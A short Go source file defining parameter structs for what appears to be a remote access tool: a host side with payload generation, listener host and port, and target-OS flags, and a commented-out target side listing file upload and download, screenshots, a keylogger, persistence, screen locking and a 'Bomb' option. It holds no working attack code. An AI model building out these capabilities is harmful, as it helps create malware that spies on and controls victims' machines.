package parameters

type HostParams struct {
	Generate bool
	Listen   bool
	Serve    bool
	Help     bool
	Exit     bool
	Windows  bool
	MacOS    bool
	Linux    bool
	LHost    string
	LPort    string
	FName    string
}

// type TargetParams struct {
// 	Download     bool
// 	DownloadPath string
// 	Upload       bool
// 	UploadPath   string
// 	OpenURL      bool
// 	OpenURLPath  string
// 	// Screenshot         bool
// 	// KeyloggerStart     bool
// 	// KeyloggerShow      bool
// 	// PersistenceEnable  bool
// 	// PersistenceDisable bool
// 	// GetOS              bool
// 	// LockScreen         bool
// 	// Bomb               bool
// 	// ClearScreen        bool
// 	// Back               bool
// 	// Exit               bool
// 	// Help               bool
// }
